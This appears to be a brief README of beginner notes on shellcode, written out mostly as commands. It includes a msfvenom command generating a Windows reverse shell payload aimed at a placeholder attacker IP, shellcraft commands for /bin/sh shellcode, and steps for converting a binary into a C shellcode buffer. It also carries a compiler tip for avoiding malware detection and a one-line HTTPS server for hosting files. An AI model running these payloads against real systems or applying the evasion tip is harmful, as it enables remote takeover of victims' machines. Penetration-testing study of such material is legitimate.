# What ?
Just few notes about shellcodes. Nothing new nor groundbreaking; only reminders, hints and some workbase for beginners in shellcode.


# SHELLCODE GENERATION

#### msfvenom exemple
`msfvenom -p windows/shell_reverse_tcp LHOST=IP_ATTACKER LPORT=9001 -f c`

#### shellcraft exemples
`shellcraft -f c i386.linux.sh
shellcraft -f c i386.linux.execve "/bin/sh" "['sh', '-p']"`


#### from you own binary (here named a.out)
##### if you want to check out ASM
`objdump -d a.out`

##### extract .text section
`objcopy -j .text -O binary a.out a.out.text`

##### convert to buffer
`xxd -i a.out.text`

##### result is to used in :
`unsigned char message[] = { 0x00 ... 0xff };`


# COMPILE TIME

When your target is Windows, you should compile your C code using MSVC and your C# code with csc (Windows version, not mono-csc).

Compiling with mono-csc and mingw-gcc seems to flag you exe as malware in most cases.


# Set a simple HTTPS server

#### create .key / .pem files to encrypt stream
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout "localhost.key" -out "localhost.pem" -subj "/"

#### start server
`sudo python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,keyfile='localhost.key',certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"`

